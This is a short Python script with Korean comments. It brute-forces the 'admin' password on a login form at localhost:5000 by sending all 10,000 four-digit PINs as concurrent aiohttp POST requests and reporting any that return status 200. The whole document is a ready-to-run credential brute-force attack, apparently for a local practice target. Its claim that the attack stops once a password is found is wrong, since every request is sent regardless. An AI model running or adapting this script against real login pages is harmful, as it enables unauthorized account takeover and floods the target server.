# pip install aiohttp
import aiohttp
import asyncio

# 대상 URL 설정
url = "http://localhost:5000/login"

# 비동기 요청 함수
async def try_password(session, password):
    data = {
        "username": "admin",
        "password": password
    }

    async with session.post(url, data=data) as response:
        if response.status == 200:
            print(f"[SUCCESS] Password found: {password}")
            return True
        else:
            print(f"[FAILED] Tried password: {password}")
            return False

# 비동기 메인 함수
async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        # 0000부터 9999까지 비밀번호 시도
        for i in range(10000):
            password = f"{i:04d}"
            tasks.append(try_password(session, password))
        
        # 모든 요청을 동시에 실행
        results = await asyncio.gather(*tasks)
        
        # 성공한 비밀번호 찾기
        if any(results):
            print("Password found and brute-force attack stopped.")
        else:
            print("No password matched.")

# 비동기 실행
asyncio.run(main())
